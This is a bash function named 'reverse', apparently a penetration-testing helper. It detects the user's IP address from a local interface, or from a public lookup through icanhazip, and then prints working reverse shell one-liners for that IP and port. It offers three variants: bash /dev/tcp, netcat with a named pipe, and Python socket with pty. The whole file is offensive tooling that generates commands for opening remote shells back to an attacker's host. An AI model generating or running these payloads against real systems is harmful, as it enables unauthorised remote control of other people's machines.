reverse ()
{
  local port=443;
  adaptors=$(ip a | egrep ^[0-9]+ | cut -d" " -f 2 | sed 's/://g');
  OPTIND=1;
  usage()( echo "reverse [-i <interface>] [-l <language>] [-p <port>]";
  printf "Language Options:\n  bash\n  nc\n  python\n\n" );
  while getopts ":i:l:p:h" options; do
      case "${options}" in
        i) local interface=${OPTARG};
          if ! echo $interface |  egrep -qo "public"; then
            if ! echo $adaptors | grep -qo "$interface"; then
              echo  "Interface "${OPTARG}" does not exist";
              usage;
              return;
            fi;
          fi
          ;;
        l) local language=${OPTARG}
          ;;
        p) local port=${OPTARG}
          ;;
        h) usage;
          return
          ;;
        :) echo "Error: -${OPTARG} requires an argument";
          usage;
          return
          ;;
        *) echo "Unknown Switch: -${OPTARG}";
          usage;
          return
          ;;
        esac;
      done;
      if [ -z $interface ]; then
        if ip a | egrep -qo "tun0"; then
          local interface="tun0";
        elif echo $interface | egrep -qo "public" ; then
          local interface="public";
        elif ip a | egrep -qo "eth0"; then
          local interface="eth0";
        elif ip a | egrep -qo "ens33"; then
          local interface="ens33";
        else
          local interface="lo";
        fi;
      fi;
      if echo $interface | egrep -qo "public"; then
        local ip=$(wget -qO - ipv4.icanhazip.com);
      else
        local ip=$(ip a show $interface | egrep -o "([0-9]{1,3}.){3}[0-9]{1,3}" | head -1);
      fi;
      local randName=$(head -4 /dev/urandom | sha256sum | base64 | head -c 5);
      declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" );
      if [ -z $language ]; then
        printf "\n";
        for i in "${shells[@]}";do
          printf "$i\n\n";
        done;
        return;
      fi;
      printf "\n${shells[$language]}\n\n"; }